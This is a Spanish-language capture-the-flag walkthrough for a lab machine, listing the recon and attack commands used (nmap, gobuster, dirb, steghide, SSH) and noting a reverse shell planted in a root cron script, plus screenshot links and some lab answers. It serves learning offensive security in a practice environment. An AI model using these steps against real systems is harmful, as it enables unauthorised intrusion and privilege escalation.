
```bash
#!/bin/bash
ping 10.10.123.80 #Hacemos un ping para ver si existe conectividad
nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 10.10.123.80 -oN escaneo 
#Vemos los puertos 80, 6498 y 65524 abiertos con la vulnerabilidad anonymous ftp
gobuster dir -u http://10.10.123.80/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
echo 'ZmxhZ3tmMXJzN19mbDRnfQ==' | base64 -d > flag1.txt
dirb http://10.10.123.80:65524/ 
hash-identifier
steghide extract -sf binarycodepixabay.jpg -p mypasswordforthatjob
cat secrettext.txt 
ssh boring@10.10.123.80 -p 6498
cat user.txt
nano /var/www/.mysecretcronjob.sh #Metemos una reverse shell alli
script /dev/null -c bash #Para obtener un promt
```
nmap![[Pasted image 20231120160805.png]]
gobuster![[Pasted image 20231120163805.png]]El directorio /hidden/whatever![[Pasted image 20231120164008.png]]
Obtención de la primera flag![[Pasted image 20231120164153.png]]
Dirb
![[Pasted image 20231120165452.png]]
Usamos hash-identifier para ver el tipo de hash![[Pasted image 20231120165151.png]]El hash crackeado![[Pasted image 20231120165357.png]]Tercera flag
![[Pasted image 20231120170104.png]]
Encontramos en el codigo de apache tambien ![[Pasted image 20231120170357.png]]
Que esta codificado en base62 siendo su desencriptación
![[Pasted image 20231120170430.png]]
Desciframos el hash que es de tipo gost![[Pasted image 20231120171838.png]]Sacamos la el archivo de la imagen![[Pasted image 20231120172139.png]]
Convertimos de binario a ASCII
![[Pasted image 20231120172251.png]]
Flag de user cifrada
![[Pasted image 20231120172524.png]]
Convertimos de rot13 a ASCII
![[Pasted image 20231120172607.png]]
Nos enviamos una shell reversa entrando en el cron de /
![[Pasted image 20231120173216.png]]
Obtenemos la flag de root![[Pasted image 20231120173656.png]]